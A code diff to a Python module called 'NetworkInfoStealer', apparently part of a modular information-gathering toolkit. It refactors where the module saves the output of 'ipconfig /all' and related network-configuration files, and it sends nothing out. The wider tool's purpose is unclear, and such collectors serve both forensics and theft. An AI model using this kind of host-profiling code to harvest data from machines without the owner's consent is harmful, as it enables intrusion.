@@ -7,7 +7,7 @@ from config import ModuleManager
 
 class NetworkInfoRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name = "NetworkInfoStealer")
+        super().__init__(module_name = "NetworkInfoStealer", module_path="network/general")
         
         self.banner(r"""
      _______         _______                               _       
@@ -20,17 +20,14 @@ class NetworkInfoRecovery(ModuleManager):
   `-=========-`()                   Information
                     """)
 
-        self.systeminfo_folder: Path = self.output_folder_user / 'network'
-        self.ipconfig_filename: Path = self.systeminfo_folder / 'ipconfig.txt'
-        self.ipconfiguration_filename: Path = self.systeminfo_folder / 'ipconfiguration.txt'
-        self.physical_adapters_filename: Path = self.systeminfo_folder / 'physical_adapters.txt'
-        self.getnet_ipconfig_filename: Path = self.systeminfo_folder / 'getnet_ipinfo.txt'
-
-        self.systeminfo_folder.mkdir(parents=True, exist_ok=True)
+        self.ipconfig_filename: Path = self.module_output / 'ipconfig.txt'
+        self.ipconfiguration_filename: Path = self.module_output / 'ipconfiguration.txt'
+        self.physical_adapters_filename: Path = self.module_output / 'physical_adapters.txt'
+        self.getnet_ipconfig_filename: Path = self.module_output / 'getnet_ipinfo.txt'
 
     def ipconfig(self) -> None:
         self.mdebug("[ipconfig] Running command: `ipconfig /all`")
-        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8', errors="backslashreplace")
+        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8', errors="backslashreplace").replace("\r\n", "\n").strip()
         self.ipconfig_filename.write_text(data, encoding="utf-8")
         self.mprint(f"[ipinfo] Saved result to {self.ipconfig_filename}")
     
